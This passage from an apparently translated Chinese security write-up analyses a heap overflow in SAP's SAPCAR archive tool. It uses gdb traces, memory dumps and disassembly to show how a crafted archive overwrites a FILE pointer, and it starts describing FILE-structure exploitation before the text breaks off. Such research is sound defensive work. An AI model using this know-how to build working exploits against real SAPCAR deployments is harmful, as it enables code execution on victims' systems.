&nbsp;&nbsp;&nbsp;0x7ffff6bc0925&nbsp;&lt;__GI__IO_unsave_markers+5&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rax,rdi
&nbsp;&nbsp;&nbsp;0x7ffff6bc0928&nbsp;&lt;__GI__IO_unsave_markers+8&gt;:&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff6bc0932&nbsp;&lt;__GI__IO_unsave_markers+18&gt;
=&gt;&nbsp;0x7ffff6bc092a&nbsp;&lt;__GI__IO_unsave_markers+10&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rdi+0x60],0x0
&nbsp;&nbsp;&nbsp;0x7ffff6bc0932&nbsp;&lt;__GI__IO_unsave_markers+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,QWORD&nbsp;PTR&nbsp;[rax+0x48]
&nbsp;&nbsp;&nbsp;0x7ffff6bc0936&nbsp;&lt;__GI__IO_unsave_markers+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;rdi,rdi
&nbsp;&nbsp;&nbsp;0x7ffff6bc0939&nbsp;&lt;__GI__IO_unsave_markers+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ffff6bc0965&nbsp;&lt;__GI__IO_unsave_markers+69&gt;
&nbsp;&nbsp;&nbsp;0x7ffff6bc093b&nbsp;&lt;__GI__IO_unsave_markers+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[rax],0x100
[------------------------------------stack-------------------------------------]
0000|&nbsp;0x7fffffffcaf8&nbsp;--&gt;&nbsp;0x7ffff6bbd872&nbsp;(&lt;_IO_new_file_close_it+50&gt;:&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[rbx+0x74],0x20)
0008|&nbsp;0x7fffffffcb00&nbsp;--&gt;&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
0016|&nbsp;0x7fffffffcb08&nbsp;--&gt;&nbsp;0x7fffffffcb50&nbsp;--&gt;&nbsp;0x7fffffffcfe0&nbsp;--&gt;&nbsp;0x7fffffffe1d0&nbsp;--&gt;&nbsp;0x7fffffffe3b0&nbsp;--&gt;&nbsp;0x5af800&nbsp;(mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rsp-0x18],rbx)
0024|&nbsp;0x7fffffffcb10&nbsp;--&gt;&nbsp;0xa30510&nbsp;(&quot;sapevents.dll&quot;)
0032|&nbsp;0x7fffffffcb18&nbsp;--&gt;&nbsp;0x7ffff6bb13ef&nbsp;(&lt;_IO_new_fclose+399&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[rbx])
0040|&nbsp;0x7fffffffcb20&nbsp;--&gt;&nbsp;0xa1c790&nbsp;--&gt;&nbsp;0xa2dc60&nbsp;--&gt;&nbsp;0xa30520&nbsp;--&gt;&nbsp;0x20&nbsp;(&#39;&nbsp;&#39;)
0048|&nbsp;0x7fffffffcb28&nbsp;--&gt;&nbsp;0x7fffffffcb50&nbsp;--&gt;&nbsp;0x7fffffffcfe0&nbsp;--&gt;&nbsp;0x7fffffffe1d0&nbsp;--&gt;&nbsp;0x7fffffffe3b0&nbsp;--&gt;&nbsp;0x5af800&nbsp;(mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rsp-0x18],rbx)
0056|&nbsp;0x7fffffffcb30&nbsp;--&gt;&nbsp;0xa30510&nbsp;(&quot;sapevents.dll&quot;)
[------------------------------------------------------------------------------]
Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
Stopped&nbsp;reason:&nbsp;SIGSEGV
__GI__IO_unsave_markers&nbsp;(fp=fp@entry=0x5a8594)&nbsp;at&nbsp;genops.c:1065</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有趣的地方在于，指向FILE结构的指针通常会在堆内存中出现问题。不过在我们的测试过程中，它指向的是文本部分中的某个位置：</span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;vmmap&nbsp;0x5a8594
Start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Perm&nbsp;&nbsp;&nbsp;&nbsp;Name
0x00400000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x007c9000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r-xp&nbsp;&nbsp;&nbsp;&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找到了该文件指针的位置并检查了周围内存区域之后，我们可以看到这些数据与输入文件内容非常相似：</span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;find&nbsp;0x5a8594
Searching&nbsp;for&nbsp;&#39;0x5a8594&#39;&nbsp;in:&nbsp;None&nbsp;ranges
Found&nbsp;1&nbsp;results,&nbsp;display&nbsp;max&nbsp;1&nbsp;items:
&nbsp;[heap]&nbsp;:&nbsp;0xa1d8d0&nbsp;--&gt;&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
gdb-peda$&nbsp;x/16xg&nbsp;0xa1d8d0&nbsp;-&nbsp;64
0xa1d890:&nbsp;&nbsp;&nbsp;&nbsp;0x6d942db80cb306f7&nbsp;&nbsp;&nbsp;&nbsp;0xb31049e79a5e9c99
0xa1d8a0:&nbsp;&nbsp;&nbsp;&nbsp;0x5bceaebdc9b16ad3&nbsp;&nbsp;&nbsp;&nbsp;0x05d38708178849d0
0xa1d8b0:&nbsp;&nbsp;&nbsp;&nbsp;0x39c05825344a4838&nbsp;&nbsp;&nbsp;&nbsp;0x00000000005b6750
0xa1d8c0:&nbsp;&nbsp;&nbsp;&nbsp;0xdacaadadcf57bed4&nbsp;&nbsp;&nbsp;&nbsp;0x4806b9a200000002
0xa1d8d0:&nbsp;&nbsp;&nbsp;&nbsp;0x00000000005a8594&nbsp;&nbsp;&nbsp;&nbsp;0x00007ffff6593fdc
0xa1d8e0:&nbsp;&nbsp;&nbsp;&nbsp;0x00007ffff6594088&nbsp;&nbsp;&nbsp;&nbsp;0x30302e3220524143
0xa1d8f0:&nbsp;&nbsp;&nbsp;&nbsp;0x000081b6f6594752&nbsp;&nbsp;&nbsp;&nbsp;0x0000000000043200
0xa1d900:&nbsp;&nbsp;&nbsp;&nbsp;0x00007fff00000000&nbsp;&nbsp;&nbsp;&nbsp;0x0000000035be41f6</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以通过grep命令得知这些值其实都存在于我们的测试文件中，准确说来，它们都位于测试文件的结尾部分：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;grep&nbsp;-obUaP&nbsp;&quot;\xa2\xb9\x06\x48\x94\x85\x5a&quot;&nbsp;crashes/lala4
30501:��H��Z
$&nbsp;xxd&nbsp;crashes/lala4&nbsp;|&nbsp;grep&nbsp;7720
00007720:&nbsp;da7a&nbsp;62ed&nbsp;e2a2&nbsp;b906&nbsp;4894&nbsp;855a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.zb.....H..Z</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么我们可以修改堆内存中的数据吗？我们可以通过向输入文件结尾添加数据并重新运行代码来得到答案：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;echo&nbsp;AAAABBBB&nbsp;&gt;&gt;&nbsp;crashes/lala4</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这一次的崩溃发生在_IO_feof，而我们现在可以完全控制文件指针的值了：</span></p><pre class="brush:plain;toolbar:false">Stopped&nbsp;reason:&nbsp;SIGSEGV
_IO_feof&nbsp;(fp=0x42414141415a8594)&nbsp;at&nbsp;feof.c:35</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.2 导致漏洞出现的根本原因</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用bt命令查看了整个栈的back-trace之后，我们发现了调用feof的函数：</span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;0x4386f0:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;rbp
&nbsp;&nbsp;&nbsp;0x4386f1:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp
&nbsp;&nbsp;&nbsp;0x4386f4:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x8],r13
&nbsp;&nbsp;&nbsp;0x4386f8:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r13,rdi
&nbsp;&nbsp;&nbsp;0x4386fb:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x18],rbx
&nbsp;&nbsp;&nbsp;0x4386ff:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x10],r12
&nbsp;&nbsp;&nbsp;0x438703:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;rsp,0x20
&nbsp;&nbsp;&nbsp;0x438707:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r12,rcx
&nbsp;&nbsp;&nbsp;0x43870a:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rcx,QWORD&nbsp;PTR&nbsp;[r13+0x18]
&nbsp;&nbsp;&nbsp;0x43870e:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsi
&nbsp;&nbsp;&nbsp;0x438711:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rbx,rdx
&nbsp;&nbsp;&nbsp;0x438714:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;esi,0x1
&nbsp;&nbsp;&nbsp;0x438719:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x40b3e0&nbsp;&lt;fread@plt&gt;
&nbsp;&nbsp;&nbsp;0x43871e:&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;rbx,rax
&nbsp;&nbsp;&nbsp;0x438721:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[r12],rax
&nbsp;&nbsp;&nbsp;0x438725:&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x438734
&nbsp;&nbsp;&nbsp;0x438727:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,QWORD&nbsp;PTR&nbsp;[r13+0x18]
&nbsp;&nbsp;&nbsp;0x43872b:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x40b340&nbsp;&lt;feof@plt&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来，我们在fread处（0x438719）设置了一个断点，然后重新运行程序。除此之外，我们需要弄清楚原始的文件指针发生了什么，所以我们还设置了一个检测点，当它被重写时我们要暂停程序的执行。我们可以通过检查那些传递给文件IO函数的参数来得到文件指针的原始地址。</span></p><pre class="brush:plain;toolbar:false">Breakpoint&nbsp;2,&nbsp;__GI__IO_fread&nbsp;(buf=0x7fffffffcb10,&nbsp;size=0x1,&nbsp;count=0x2,&nbsp;fp=0xa2da10)&nbsp;at&nbsp;iofread.c:31
gdb-peda$&nbsp;find&nbsp;0xa2da10
Searching&nbsp;for&nbsp;&#39;0xa2da10&#39;&nbsp;in:&nbsp;None&nbsp;ranges
Found&nbsp;1&nbsp;results,&nbsp;display&nbsp;max&nbsp;1&nbsp;items:
[heap]&nbsp;:&nbsp;0xa1d8d0&nbsp;--&gt;&nbsp;0xa2da10&nbsp;--&gt;&nbsp;0xfbad2488&nbsp;
gdb-peda$&nbsp;watch&nbsp;*0xa1d8d0
Hardware&nbsp;watchpoint&nbsp;1:&nbsp;*0xa1d8d0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以看到第一个检测点，这部分数据是正确的：</span></p><pre class="brush:plain;toolbar:false">Hardware&nbsp;watchpoint&nbsp;1:&nbsp;*0xa1d8d0
Old&nbsp;value&nbsp;=&nbsp;0x0
New&nbsp;value&nbsp;=&nbsp;0xa2da10
0x000000000043859f&nbsp;in&nbsp;??&nbsp;()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而第二个检测点则出现了溢出的情况：</span></p><pre class="brush:plain;toolbar:false">Hardware&nbsp;watchpoint&nbsp;1:&nbsp;*0xa1d8d0
Old&nbsp;value&nbsp;=&nbsp;0xa2da10
New&nbsp;value&nbsp;=&nbsp;0x415a8594
gdb-peda$&nbsp;bt
#0&nbsp;&nbsp;0x00007ffff6c3a680&nbsp;in&nbsp;__read_nocancel&nbsp;()&nbsp;at&nbsp;../sysdeps/unix/syscall-template.S:84
#1&nbsp;&nbsp;0x00007ffff6bbcf79&nbsp;in&nbsp;__GI__IO_file_xsgetn&nbsp;(fp=0xa2da10,&nbsp;data=&lt;optimized&nbsp;out&gt;,&nbsp;n=0xb5ef)&nbsp;at&nbsp;fileops.c:1434
#2&nbsp;&nbsp;0x00007ffff6bb2236&nbsp;in&nbsp;__GI__IO_fread&nbsp;(buf=&lt;optimized&nbsp;out&gt;,&nbsp;size=0x1,&nbsp;count=0xb5ef,&nbsp;fp=0xa2da10)&nbsp;at&nbsp;iofread.c:38
#3&nbsp;&nbsp;0x000000000043871e&nbsp;in&nbsp;??&nbsp;()
#4&nbsp;&nbsp;0x000000000040c01a&nbsp;in&nbsp;??&nbsp;()
#5&nbsp;&nbsp;0x000000000040dc5f&nbsp;in&nbsp;??&nbsp;()
#6&nbsp;&nbsp;0x0000000000418e23&nbsp;in&nbsp;??&nbsp;()
#7&nbsp;&nbsp;0x000000000042bc43&nbsp;in&nbsp;??&nbsp;()
#8&nbsp;&nbsp;0x000000000043fc66&nbsp;in&nbsp;??&nbsp;()
#9&nbsp;&nbsp;0x00007ffff6b64830&nbsp;in&nbsp;__libc_start_main&nbsp;(main=0x43ffb0,&nbsp;argc=0x3,&nbsp;argv=0x7fffffffe498,&nbsp;init=&lt;optimized&nbsp;out&gt;,&nbsp;fini=&lt;optimized&nbsp;out&gt;,&nbsp;rtld_fini=&lt;optimized&nbsp;out&gt;,&nbsp;stack_end=0x7fffffffe488)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;../csu/libc-start.c:291</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是，我们可以看到fread被调用并读取了0xb5ef字节，并导致了文件指针被重写。检测数据如下：</span></p><pre class="brush:plain;toolbar:false">fread&nbsp;&nbsp;size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contents
-----------------------------------------------------------------------------
#1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File&nbsp;Format&nbsp;/&nbsp;Version&nbsp;=&nbsp;CAR&nbsp;2.00
#2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x22&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;RG&nbsp;(regular&nbsp;file)
#3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xd&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File&nbsp;name&nbsp;=&nbsp;sapevents.dll
#4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;type&nbsp;-&nbsp;SAPCAR_BLOCK_TYPE_COMPRESSED&nbsp;=&nbsp;&quot;DA&quot;
#5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;????
#6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;type&nbsp;-&nbsp;SAPCAR_BLOCK_TYPE_COMPRESSED&nbsp;=&nbsp;&quot;DA&quot;
#7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;????
#8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;type&nbsp;-&nbsp;INVALID&nbsp;TYPE&nbsp;=&nbsp;&quot;D&gt;&quot;
#9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x20&nbsp;bytes&nbsp;&nbsp;&nbsp;&nbsp;????
#10&nbsp;&nbsp;&nbsp;&nbsp;0xb5ef&nbsp;bytes&nbsp;&nbsp;User&nbsp;controlled&nbsp;data&nbsp;that&nbsp;will&nbsp;overwrite&nbsp;stuff&nbsp;on&nbsp;the&nbsp;heap</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有效的数据块类型为DA、ED、UD和UE。当文件中包含其他标识符时，程序将会额外读取32个字节，其中包含某些文件元数据（细节内容尚不知晓）。但是在对输入内容的最后四个字节数据进行了分析之后，我们发现它包含的是下一个fread的大小：</span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;x/32xb&nbsp;0xa2dc62
0xa2dc62:&nbsp;&nbsp;&nbsp;&nbsp;0x01&nbsp;&nbsp;&nbsp;&nbsp;0xac&nbsp;&nbsp;&nbsp;&nbsp;0xa6&nbsp;&nbsp;&nbsp;&nbsp;0x08&nbsp;&nbsp;&nbsp;&nbsp;0x3c&nbsp;&nbsp;&nbsp;&nbsp;0x27&nbsp;&nbsp;&nbsp;&nbsp;0xb8&nbsp;&nbsp;&nbsp;&nbsp;0xc4
0xa2dc6a:&nbsp;&nbsp;&nbsp;&nbsp;0x62&nbsp;&nbsp;&nbsp;&nbsp;0x28&nbsp;&nbsp;&nbsp;&nbsp;0x9d&nbsp;&nbsp;&nbsp;&nbsp;0x19&nbsp;&nbsp;&nbsp;&nbsp;0xe2&nbsp;&nbsp;&nbsp;&nbsp;0xd3&nbsp;&nbsp;&nbsp;&nbsp;0xa3&nbsp;&nbsp;&nbsp;&nbsp;0xc3
0xa2dc72:&nbsp;&nbsp;&nbsp;&nbsp;0xcb&nbsp;&nbsp;&nbsp;&nbsp;0x94&nbsp;&nbsp;&nbsp;&nbsp;0x5d&nbsp;&nbsp;&nbsp;&nbsp;0xec&nbsp;&nbsp;&nbsp;&nbsp;0x02&nbsp;&nbsp;&nbsp;&nbsp;0x36&nbsp;&nbsp;&nbsp;&nbsp;0x7b&nbsp;&nbsp;&nbsp;&nbsp;0x9f
0xa2dc7a:&nbsp;&nbsp;&nbsp;&nbsp;0x52&nbsp;&nbsp;&nbsp;&nbsp;0xb8&nbsp;&nbsp;&nbsp;&nbsp;0x2a&nbsp;&nbsp;&nbsp;&nbsp;0xfb&nbsp;&nbsp;&nbsp;&nbsp;0x1f&nbsp;&nbsp;&nbsp;&nbsp;0x6a&nbsp;&nbsp;&nbsp;&nbsp;0xef&nbsp;&nbsp;&nbsp;&nbsp;0xb5</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在输入文件中修改了这些字节数据之后，我们将能够控制传递给fread的数据大小（最多2个字节）。通过对之前malloc的访问以及程序执行流的监控，我们找到了导致漏洞出现的原因：</span></p><pre class="brush:php;toolbar:false">0x40c01e:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rcx,r14
&nbsp;&nbsp;&nbsp;0x40c021:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;esi,0x1100
&nbsp;&nbsp;&nbsp;0x40c026:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,r14
&nbsp;&nbsp;&nbsp;0x40c029:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x4a73a0
---&gt;
&nbsp;&nbsp;&nbsp;0x4a73a0:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;rbp
&nbsp;&nbsp;&nbsp;0x4a73a1:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp
&nbsp;&nbsp;&nbsp;0x4a73a4:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x28],rbx
&nbsp;&nbsp;&nbsp;0x4a73a8:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x20],r12
&nbsp;&nbsp;&nbsp;0x4a73ac:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;rbx,rcx
&nbsp;&nbsp;&nbsp;0x4a73af:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x18],r13
&nbsp;&nbsp;&nbsp;0x4a73b3:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x10],r14
&nbsp;&nbsp;&nbsp;0x4a73b7:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r14,rdi
&nbsp;&nbsp;&nbsp;0x4a73ba:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rbp-0x8],r15
&nbsp;&nbsp;&nbsp;0x4a73be:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;edi,esi
&nbsp;&nbsp;&nbsp;0x4a73c0:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;rsp,0x40
&nbsp;&nbsp;&nbsp;0x4a73c4:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r12d,esi
&nbsp;&nbsp;&nbsp;0x4a73c7:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r15,rdx
&nbsp;&nbsp;&nbsp;0x4a73ca:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x459720
---&gt;
&nbsp;&nbsp;&nbsp;0x45973d:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;r13d,edi
&nbsp;&nbsp;&nbsp;[...]
&nbsp;&nbsp;&nbsp;0x45977d:&nbsp;&nbsp;&nbsp;&nbsp;movsxd&nbsp;rdi,r13d
&nbsp;&nbsp;&nbsp;0x459780:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x40b0c0&nbsp;&lt;malloc@plt&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，引起溢出的原因已经很明显了：我们将任意大小（最大为0xffff）的数据拷贝到了一个大小只有0x1100的缓冲区中。因为当数据块类型未知时，程序只会根据输入文件中的元数据大小来动态分配缓冲区空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过整合上述这些内容，我们就可以设计一个简单的漏洞利用技术来实现代码执行了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四、漏洞利用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于我们可以重写指向FILE结构的指针，因此漏洞的利用也是非常简单的。在设计漏洞利用方法之前，我们首先要了解这个名叫</span><a href="https://github.com/shellphish/how2heap" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">how2heap</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的库，并且读一下Kees Cook的这篇关于利用FILE结构的文章【</span><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">点我阅读</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">】。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">核心思想如下：当fopen被调用时，系统会分配一个新的FILE结构。glibc将会分配一个内部结构，其中包含结构体_IO_FILE和一个指向另一个结构体（调用_IO_jump_t）的指针:</span></p><pre class="brush:plain;toolbar:false">Breakpoint&nbsp;1,&nbsp;__GI__IO_fread&nbsp;(buf=0xa1d8e8,&nbsp;size=0x1,&nbsp;count=0x8,&nbsp;fp=0xa2da10)&nbsp;at&nbsp;iofread.c:31
gdb-peda$&nbsp;p&nbsp;*fp
$2&nbsp;=&nbsp;{
&nbsp;&nbsp;_flags&nbsp;=&nbsp;0xfbad2488,&nbsp;
&nbsp;&nbsp;_IO_read_ptr&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_read_end&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_read_base&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_write_base&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_write_ptr&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_write_end&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_buf_base&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_buf_end&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_save_base&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_backup_base&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_IO_save_end&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_markers&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_chain&nbsp;=&nbsp;0x7ffff6f08540&nbsp;&lt;_IO_2_1_stderr_&gt;,&nbsp;
&nbsp;&nbsp;_fileno&nbsp;=&nbsp;0x3,&nbsp;
&nbsp;&nbsp;_flags2&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_old_offset&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_cur_column&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_vtable_offset&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_shortbuf&nbsp;=&nbsp;&quot;&quot;,&nbsp;
&nbsp;&nbsp;_lock&nbsp;=&nbsp;0xa2daf0,&nbsp;
&nbsp;&nbsp;_offset&nbsp;=&nbsp;0xffffffffffffffff,&nbsp;
&nbsp;&nbsp;_codecvt&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_wide_data&nbsp;=&nbsp;0xa2db00,&nbsp;
&nbsp;&nbsp;_freeres_list&nbsp;=&nbsp;0x0,&nbsp;
